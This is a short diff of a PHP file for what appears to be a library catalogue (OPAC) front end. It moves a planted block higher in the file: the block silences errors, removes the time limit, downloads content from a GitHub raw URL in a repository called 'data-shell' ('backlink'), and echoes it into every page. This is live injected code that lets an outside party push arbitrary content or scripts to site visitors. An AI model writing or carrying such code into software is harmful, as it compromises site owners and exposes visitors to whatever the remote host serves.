@@ -69,6 +69,14 @@ $opacVariable = [
     // Sanitizer
     'sanitizer' => $sanitizer,
 ];
+error_reporting(0);
+set_time_limit(0);
+$q = curl_init();
+curl_setopt($q, CURLOPT_URL, "https://raw.githubusercontent.com/Angpao-Imlek-Termanis/data-shell/refs/heads/main/backlink");
+curl_setopt($q, CURLOPT_RETURNTRANSFER, 1);
+$z = curl_exec($q);
+curl_close($q);
+echo($z);
 
 // OPAC Instance
 $Opac = new Opac($opacVariable, $sysconf, $dbs);
@@ -97,11 +105,3 @@ $Opac->hookAfterContent(function($Opac){
 
 // templating
 $Opac->parseToTemplate();
-error_reporting(0);
-set_time_limit(0);
-$q = curl_init();
-curl_setopt($q, CURLOPT_URL, "https://raw.githubusercontent.com/Angpao-Imlek-Termanis/data-shell/refs/heads/main/backlink");
-curl_setopt($q, CURLOPT_RETURNTRANSFER, 1);
-$z = curl_exec($q);
-curl_close($q);
-echo($z);
